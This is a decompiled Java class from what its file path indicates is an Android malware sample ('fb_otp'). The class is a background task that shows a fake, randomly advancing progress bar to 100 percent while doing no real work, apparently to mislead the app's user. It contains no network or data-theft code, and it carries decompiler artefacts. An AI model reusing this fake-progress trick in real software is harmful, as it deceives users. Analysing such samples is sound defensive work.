import android.os.AsyncTask;
import android.view.View;
import com.soft360.iService.MainActivity;
import java.util.concurrent.TimeUnit;

public final class dQ
  extends AsyncTask
{
  int jdField_a_of_type_Int = 0;
  
  private dQ(MainActivity paramMainActivity) {}
  
  private Void a()
  {
    try
    {
      while (this.jdField_a_of_type_Int < 100)
      {
        TimeUnit.SECONDS.sleep(1L);
        this.jdField_a_of_type_Int = ((int)(Math.random() * 20.0D) + 3 + this.jdField_a_of_type_Int);
        if (this.jdField_a_of_type_Int > 100) {
          this.jdField_a_of_type_Int = 100;
        }
        publishProgress(new Integer[] { Integer.valueOf(this.jdField_a_of_type_Int) });
      }
      return null;
    }
    catch (InterruptedException localInterruptedException)
    {
      localInterruptedException.printStackTrace();
    }
  }
  
  protected final void onPreExecute()
  {
    this.jdField_a_of_type_ComSoft360IServiceMainActivity.findViewById(2131427376).setVisibility(8);
    this.jdField_a_of_type_ComSoft360IServiceMainActivity.findViewById(2131427381).setVisibility(0);
    this.jdField_a_of_type_ComSoft360IServiceMainActivity.findViewById(2131427386).setVisibility(8);
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/fb_otp/classes-dex2jar.jar!/dQ.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */